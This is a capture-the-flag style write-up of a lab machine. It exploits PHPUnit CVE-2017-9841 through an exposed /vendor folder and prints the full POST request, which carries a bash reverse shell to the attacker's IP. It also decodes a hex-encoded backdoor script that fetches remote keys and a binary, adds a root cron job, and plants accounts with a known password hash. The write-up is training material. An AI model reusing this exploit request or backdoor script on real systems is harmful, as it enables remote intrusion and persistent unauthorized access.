We can see there is a `store.djewelry.htb` link on the main page. Add this to our `/etc/hosts`

the `/vendor/` directory lists a few interesting plugins

```
composer
doctrine/instantiator
myclabs deepcopy
phpdocumentor
phpspec
phpunit (possibly vulnerable to CVE-2017-9841)
sebation
sympfony
webmozart
```

---

## CVE-2017-9841

Util/PHP/eval-stdin.php in PHPUnit before 4.8.28 and 5.x before 5.6.3 allows remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a `<?php`  substring, 

as demonstrated by an attack on a site with an exposed /vendor folder, i.e., external access to the `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` URI.


We can test this by sending `<?=phpinfo()?>` in the data portion of a POST request. We get a phpinfo page back, so we know it works.


This request works to generate a rev shell:

```
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: store.djewelry.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36
Accept: */*
Sec-GPC: 1
Referer: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 73

<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.47/4444 0>&1'");
```


We now have a shell as `www-data`



---

After enumerating for awhile and asking for hints, I find an interesting file here:

`/var/backups/info`

I make a copy on my machine and run `strings` and find this:

```
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
```

Put it in cyberchef and it is Hex. Decode from Hex to reveal this:

```
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; 
wget tempfiles.xyz/.main -O /var/lib/.main; 
chmod 755 /var/lib/.main; 
echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; 

awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; 

awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; 

while read -r user group home shell _; 

do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```


`$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/`

We are able to crack this using hashcat and get the password for `steven1:ihatehackers`
